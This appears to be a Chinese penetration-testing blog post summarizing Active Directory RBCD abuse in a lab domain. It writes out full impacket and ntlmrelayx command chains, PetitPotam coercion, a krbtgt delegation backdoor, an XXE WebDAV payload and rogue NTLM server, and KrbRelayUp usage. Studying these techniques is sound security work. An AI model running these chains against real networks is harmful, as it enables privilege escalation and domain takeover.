---
title: "基于资源的约束委派 (RBCD) 利用总结"
date: 2023-08-01T20:47:55+08:00
lastmod: 2023-08-01T20:47:55+08:00
draft: false
author: "X1r0z"

tags: ['rbcd', 'ntlm', 'kerberos', 'windows']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

RBCD 常见利用方法以及在 Relay 攻击中的应用

<!--more-->

## 介绍

为了使用户/资源更加独立, Microsoft 在 Windows Server 2012 中引入了基于资源的约束委派 (Resource-Based Constrained Delegation), RBCD 将委派的控制权从拥有 SeEnableDelegation 特权的账户 (一般为域管理员) 转交给被访问的资源

例如从 Service A 到 Service B 的委派

传统的约束委派是正向的, 需要以域管的权限将 Service A 的 `msDS-AllowedToDelegateTo` 属性指定为 Service B

而基于资源的约束委派则是反向的, 无需域管权限, 只需要在 Service B 上将 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性指定为 Service A, 即可完成委派的配置

详细参考文章: [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)

配置 RBCD 的关键在于 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性, 通常以下用户能够修改此属性

- 将主机加入域的用户 (机器账户中会有一个 msDS-CreatorSID 属性, 使用非域管账户加入域时才会显示)

- Account Operators (能修改任意域内非域控机器的委派属性)

- NT AUTHORITY\SELF (该主机的机器账户)

下面简要总结 RBCD 的常见利用方法以及在 Relay 攻击中的应用

## 常规利用

一般的情况是我们拿到一个域内的普通用户, 并且发现某台机器是通过该用户加入域的, 那么就可以通过 RBCD 在该机器上实现本地提权

思路:

1. 利用可控域用户创建一个机器账户 (每个域用户默认可以创建 10 个机器账户, 即 `msDS-MachineAccountQuota (MAQ)` 属性)
2. 修改目标主机的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性, 使其指向新创建机器账户的 SID
3. 利用该机器账户的凭证通过 S4U 协议申请委派至目标主机的 ST 票据, 实现本地提权/横向移动

通过 AdFind 查询域内机器的 CreatorSID 属性

```shell
AdFind.exe -b "DC=hack-my,DC=com" -f "objectClass=computer" cn ms-DS-CreatorSID
```

![image-20230801155807265](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011558298.png)

可以发现 WIN2008-WEB 这台机器是通过 Alice 加入域的, 那么 Alice 就有权限修改它的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性

首先利用 Alice 账户在域内添加一个机器账户

```shell
addcomputer.py hack-my.com/Alice:'Alice123!' -computer-name TEST\$ -computer-pass 123456 -dc-host DC.hack-my.com -dc-ip 192.168.30.10 
```

然后配置 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性

```shell
rbcd.py hack-my.com/Alice:'Alice123!' -dc-ip 192.168.30.10  -action write -delegate-to WIN2008-WEB\$ -delegate-from TEST\$
```

![image-20230801160224149](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011602178.png)

可以看到已经成功配置了 RBCD

最后利用 S4U 协议伪造 Administrator 用户申请 ST

```shell
getST.py -dc-ip 192.168.30.10 -spn cifs/WIN2008-WEB.hack-my.com -impersonate Administrator hack-my.com/test\$:123456

export KRB5CCNAME=Administrator.ccache
psexec.py -no-pass -k WIN2008-WEB.hack-my.com -dc-ip 192.168.30.10
```

![image-20230801160339731](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011603762.png)

## 服务账户提权

参考文章:

[https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw](https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw)

https://www.cnblogs.com/nice0e3/p/17041293.html

原理: IIS, MSSQL, Network Service 等服务账户出网时使用的是本机的机器账户, 访问域内资源时能够以机器账户的身份修改自身的委派属性, 从而提升至本地管理员权限

[https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)

![图片](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011607073.jpeg)

以 WIN2008-WEB 的 IIS 服务为例

![image-20230801161406932](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011614979.png)

这里先执行 `dir \\192.168.30.40\c$`, 通过 Responder 可以发现 IIS 出网时使用的是本机的机器账户

![image-20230801161606081](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011616127.png)

利用 SharpAllowedToAct

[https://github.com/pkb1s/SharpAllowedToAct](https://github.com/pkb1s/SharpAllowedToAct)

思路跟上文差不多, 都是先利用当前用户的身份创建机器账户并配置委派属性

```shell
C:\inetpub\wwwroot\SharpAllowedToAct.exe -m TEST -p 123456 -t WIN2008-WEB
```

![image-20230801162010847](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011620878.png)

## RBCD 后门

利用 RBCD, 设置 krbtgt 服务的委派属性为指定后门账户, 从而打造变种黄金票据

首先添加机器账户

```shell
addcomputer.py hack-my.com/Alice:'Alice123!' -computer-name TEST\$ -computer-pass 123456 -dc-host DC.hack-my.com -dc-ip 192.168.30.10 
```

在域控上执行如下命令, 配置 krbtgt 的委派属性

```powershell
Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount test$
```

![image-20230801162355498](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011623536.png)

最后申请 ST

```shell
getST.py hack-my.com/test\$:123456 -spn krbtgt -impersonate administrator -dc-ip 192.168.30.10

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass administrator@DC.hack-my.com -dc-ip 192.168.30.10
```

![image-20230801162610215](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011626255.png)

可以连接到域内的任何一台机器

## NTLM Relay to LDAP

NTLM Relay 经常会结合 RBCD 一起利用, 后者作为中继至 LDAP 的一种利用手段, 当然也还有其它的利用方式, 比如配合 Exchange 机器账户写 DCSync 权限, 利用 Shadow Credentials 等等

下面简要介绍利用 SMB, HTTP, WebDAV 协议进行 NTLM Relay to LDAP 并配置 RBCD 实现本地提权/横向移动

### SMB

默认情况下, LDAP 的签名策略为协商签名 (是否签名由客户端决定), 当使用 SMB 协议发起 LDAP 请求时, 就会要求 LDAP 服务器对 NTLM 认证请求强制签名, 所以一般来说无法通过 SMB 协议进行 NTLM Relay to LDAP

但是 2019 年爆出了 CVE-2019-1040 漏洞, 它能够绕过 NTLM MIC 的防护机制, 修改 NTLM 请求中的某些标志位, 使得客户端对于 SMB 发起的 LDAP 请求不要求签名, 从而实现 NTLM Relay

结合强制认证 (例如 SpoolSample, PetitPotam) 配合 RBCD 可以实现横向移动

首先添加机器账户

```shell
addcomputer.py hack-my.com/Alice:'Alice123!' -computer-name TEST\$ -computer-pass 123456 -dc-host DC.hack-my.com -dc-ip 192.168.30.10 
```

启动 ntlmrelayx, 注意设置 `--remove-mic` 选项

```shell
ntlmrelayx.py -t ldap://192.168.30.10 --remove-mic --delegate-access --escalate-user 'TEST$'
```

利用 PetitPotam 发起对恶意机器的 SMB 请求

```shell
python3 PetitPotam.py -d hack-my.com -u Alice -p 'Alice123!' 192.168.30.40 192.168.30.20
```

![image-20230801165443199](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011654251.png)

最后申请 ST

```shell
getST.py hack-my.com/test\$:123456 -spn cifs/WIN7-CLIENT.hack-my.com -impersonate administrator -dc-ip 192.168.30.10

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass administrator@WIN7-CLIENT.hack-my.com -dc-ip 192.168.30.10
```

![image-20230801165606720](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011656768.png)

### HTTP

参考文章:

[https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/](https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/)

[https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/](https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/)

[https://y4er.com/posts/xxe-to-dc-replay/](https://y4er.com/posts/xxe-to-dc-replay/)

原理是 Tomcat 5 WebDAV 的 PROPFIND 等方法在接受 XML 作为输入时存在 XXE 漏洞, 其发送请求时使用的 HttpURLConnection 类在接收到状态码为 401 的响应之后会判断 `WWW-Authenticate` 的值, 如果为 `NTLM` 则会自动使用当前用户的凭据进行认证

而对于 HTTP/WebDAV 协议发起的 LDAP 请求是不要求强制签名的, 因此也可以实现 NTLM Relay

简单调试一下, 本质是低版本的 JDK 对于 TrustedSites 的判断会一直返回 true, 导致对于任意网站 HttpURLConnection 都会尝试以当前用户的身份发起 NTLM 认证请求

测试 JDK 8u40 以及参考文章中的 JDK 1.5, JDK 8u161 均存在此漏洞, 在 JDK 8u351 中已经修复 (针对 TrustedSites 增加了 AuthMode 字段, 默认为 `DISABLED`), 但不清楚具体是哪一个小版本修复的 (

web 服务

```python
import socket    

s = socket.socket()
s.bind(('0.0.0.0', 8000))
 
s.listen(5)

raw = b'''HTTP/1.1 401 Unauthorized
WWW-Authenticate: NTLM

'''.replace(b'\n',b'\r\n')

while True:
  conn, addr = s.accept()
  rev = conn.recv(1024)
  print(rev.decode())
  conn.send(raw)
  conn.close()
```

demo

```java
package org.example;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) throws Exception{
        URL url = new URL("http://192.168.30.40:8000/");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.connect();
        Scanner s = new Scanner(conn.getInputStream()).useDelimiter("\\A");
        String result = s.hasNext()? s.next() : "";
        System.out.println(result);
    }
}
```

首先判断返回头 `WWW-Authenticate` 的值是否为 `NTLM`

![image-20230801195014052](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011950125.png)

之后一路跟进, 来到 `getServerAuthentication` 方法

![image-20230801195345942](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011953009.png)

调用 `sun.net.www.protocol.http.NTLMAuthenticationProxy#isTrustedSite` 方法判断是否是受信任的网站

![image-20230801195413788](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011954859.png)

NTLMAuthenticationProxy 通过反射调用 NTLMAuthentication 的 isTrustedSite 方法

![image-20230801195514538](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011955610.png)

调用 `sun.net.www.protocol.http.ntlm.NTLMAuthenticationCallback.DefaultNTLMAuthenticationCallback#isTrustedSite`

![image-20230801195525846](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011955923.png)

默认为 true, 没有经过任何限制

web 服务接收到的两次 http 请求

```
GET / HTTP/1.1
User-Agent: Java/1.8.0_40
Host: 192.168.30.40:8000
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive


GET / HTTP/1.1
User-Agent: Java/1.8.0_40
Host: 192.168.30.40:8000
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
Authorization: NTLM TlRMTVNTUAABAAAAB7IIogkACQAzAAAACwALACgAAAAKAGFKAAAAD01JTkktU0VSVkVSV09SS0dST1VQ

```

而在高版本的 JDK 中, NTLMAuthentication 类加入了 AuthMode 字段

![image-20230801195950854](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011959952.png)

![image-20230801200042689](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308012000799.png)

默认为 `DISABLED`, 因此无法自动以当前用户的身份发起 NTLM 认证请求

下面尝试在 JDK 1.5 + Tomcat 5 WebDAV 环境下复现从 XXE 到 NTLM Relay 的过程

注意 Tomcat 必须要以 SYSTEM 权限启动, 因为 SYSTEM 出网时使用的是当前机器的机器账户, 能够为自身配置 RBCD

然后在 SYSTEM 的 context 中要手动配置 `JAVA_HOME` 环境变量

```shell
SET JAVA_HOME=C:\Java\jdk1.5.0_22
```

![image-20230801200325895](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308012003009.png)

启动 ntlmrealyx

```shell
ntlmrelayx.py -t ldap://192.168.30.10 --delegate-access --escalate-user 'TEST$'
```

payload

```http
PROPFIND /webdav/ HTTP/1.1
Host: 192.168.30.20:8080
Connection: close
Content-Length: 249

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE propertyupdate [
<!ENTITY loot SYSTEM "http://192.168.30.40/"> ]>
<D:propertyupdate
    xmlns:D="DAV:">
    <D:set>
        <D:prop>
            <a
                xmlns="http://192.168.30.40/">&loot;
            </a>
        </D:prop>
    </D:set>
</D:propertyupdate>
```

![image-20230801172615159](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011726216.png)

![image-20230801172627011](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308011726071.png)

### WebDAV

参考文章: [https://whoamianony.top/posts/privilege-escalation-ntlmrelay2self-over-http-webdav/](https://whoamianony.top/posts/privilege-escalation-ntlmrelay2self-over-http-webdav/)

Windows 使用 WebClient 服务实现 WebDAV, 请求的 UNC 路径格式为 `\\evilhost@80\webdav\`

WebClient 在 Workstation 系统中是默认启用的, 但需要手动启动服务, 而 Server 系统需要通过附加功能来安装并启用 WebDAV 组件

原理:

1. 客户端发出一个 OPTIONS 方法来发现服务器支持的请求方法
2. 如果支持 PROPFIND 方法, 则发出 PROPFIND 请求来发现目录结构
3. 如果服务器以 401 Unauthorized 响应并通过 WWW-Authenticate 标头请求 NTLM 身份验证, 则 WebDAV 将继续启动 NTLM 质询响应身份验证, 最终将 Net-NTLM Hash 提供给服务器

默认情况下, WebClient 仅对本地内部网 (Local Intranet) 或受信任的站点 (Trusted Sites) 列表中的目标自动使用当前用户凭据进行 NTLM 认证

因此需要以任意域用户的权限在内网 DNS 上添加一条恶意的 A 记录, 然后通过强制认证配合 NTLM Relay to LDAP 配置 RBCD 实现横向移动

利用过程如下

先在机器上手动启动 WebClient 服务

![image-20230801201223043](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308012012173.png)

服务发现

```shell
crackmapexec smb 192.168.30.0/24 -u Alice -p 'Alice123!' -d hack-my.com  -M webdav
```

![image-20230801201316851](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308012013981.png)

添加 DNS 记录, 使其指向攻击者的主机

[https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)

```shell
python3 dnstool.py -u hack-my.com\\Alice -p 'Alice123!' -r evil.hack-my.com -d 192.168.30.40 -a add DC.hack-my.com
python3 dnstool.py -u hack-my.com\\Alice -p 'Alice123!' -r evil.hack-my.com -a query DC.hack-my.com
```

![image-20230801201614205](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308012016337.png)

NTLM Relay + PetitPotam

```shell
ntlmrelayx.py -t ldap://192.168.30.10 --escalate-user TEST\$ --delegate-access --no-dump

python3 PetitPotam.py 'evil@80/webdav' 192.168.30.30 -d hack-my.com -u Alice -p 'Alice123!'
```

实测需要等一段时间 + 多次尝试才能成功触发

![image-20230801201948830](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308012019889.png)

![image-20230801202048680](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308012020734.png)

## Kerberos Relay to LDAP

参考文章:

[https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)

[https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html)

[https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)

[https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9)

大概意思好像是可以通过 DCOM 或者 DNS 触发 Kerberos Relay, 并使用当前机器账户的 ST 中继至 LDAP 服务从而配置 RBCD/Shadow Credentials

先挖个坑, 找个时间仔细研究一下(

[https://github.com/ShorSec/KrbRelayUp](https://github.com/ShorSec/KrbRelayUp)

配置 RBCD

```shell
KrbRelayUp.exe relay -Domain hack-my.com -CreateNewComputerAccount -ComputerName test$ -ComputerPassword 123456
```

spawn shell, 当然这里也可以用 impacket

```shell
KrbRelayUp.exe spawn -m rbcd -d hack-my.com -dc DC.hack-my.com -cn test$ -cp 123456
```

![image-20230801203310510](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308012033661.png)

![image-20230801203420037](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308012034182.png)